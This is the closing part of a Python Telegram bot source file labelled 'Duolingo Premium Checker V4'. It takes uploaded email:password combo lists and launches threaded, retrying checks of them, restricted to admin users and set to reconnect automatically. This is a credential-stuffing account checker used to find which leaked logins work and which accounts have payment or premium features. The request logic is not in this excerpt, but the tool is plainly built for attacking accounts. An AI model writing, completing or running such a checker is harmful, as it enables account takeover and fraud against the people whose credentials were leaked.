# ========== COMMANDS ==========
@bot.message_handler(commands=['start'])
def start_command(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "⛔ Unauthorized user.")
        return
    send_main_menu(message.chat.id)

@bot.message_handler(commands=['stop'])
def stop_command(message):
    global stop_flag, checking_active, current_executor, current_futures

    if not is_admin(message.from_user.id):
        bot.reply_to(message, "⛔ Unauthorized.")
        return

    if checking_active:
        stop_flag = True
        if current_futures:
            for future in current_futures:
                future.cancel()
        bot.reply_to(message, "🛑 Stopping... Please wait.")
    else:
        bot.reply_to(message, "ℹ️ No active check.")

@bot.message_handler(content_types=['document'])
def handle_file(message):
    global checking_active

    if not is_admin(message.from_user.id):
        bot.reply_to(message, "⛔ Unauthorized")
        return

    if checking_active:
        bot.reply_to(message, "⚠️ Check running! Use /stop first.")
        return

    status_msg = bot.reply_to(message, "📥 Downloading file...")

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)

        content = downloaded_file.decode('utf-8', errors='ignore')
        combos = []
        for line in content.split('\n'):
            line = line.strip()
            if ':' in line:
                parts = line.split(':', 1)
                email = parts[0].strip()
                pwd = parts[1].strip()
                if email and pwd:
                    combos.append((email, pwd))

        if not combos:
            bot.edit_message_text("❌ No valid combos found.\nFormat: email:password",
                                 status_msg.chat.id, status_msg.message_id)
            return

        bot.edit_message_text(f"""
╭─── ✅ 𝗙𝗜𝗟𝗘 𝗟𝗢𝗔𝗗𝗘𝗗 ──────────────────╮
│  📋  Combos: {len(combos):,}
│  🧵  Threads: {MAX_THREADS}
│  🔄  Retries: {MAX_RETRIES}x
╰────────────────────────────────────╯

🚀 Starting check...""",
                             status_msg.chat.id, status_msg.message_id, parse_mode='Markdown')

        thread = threading.Thread(target=process_combos, args=(message.chat.id, combos))
        thread.daemon = True
        thread.start()

    except Exception as e:
        logging.error(f"File handling error: {e}")
        bot.edit_message_text(f"❌ Error: {str(e)[:100]}", status_msg.chat.id, status_msg.message_id)

# ========== BOT START WITH AUTO-RECONNECT ==========
def run_bot():
    """Run bot with auto-reconnect to prevent Railway crashes"""
    while True:
        try:
            print("═" * 50)
            print("🦉 DUOLINGO PREMIUM CHECKER V4")
            print("═" * 50)
            print(f"  👑 Admin: {ADMIN_IDS}")
            print(f"  🧵 Threads: {MAX_THREADS}")
            print(f"  🔄 Retries: {MAX_RETRIES}x")
            print(f"  ⏱  Timeout: {REQUEST_TIMEOUT}s")
            print(f"  📊 Features: Payment | Social | Family Invite | XP | Language")
            print("═" * 50)
            print("🟢 Bot started! Polling...")
            bot.infinity_polling(timeout=60, long_polling_timeout=60, allowed_updates=None)
        except KeyboardInterrupt:
            print("🛑 Bot stopped by user.")
            break
        except Exception as e:
            logging.error(f"Bot polling error: {e}")
            logging.info("🔄 Reconnecting in 5 seconds...")
            time.sleep(5)
            continue

if __name__ == "__main__":
    run_bot()
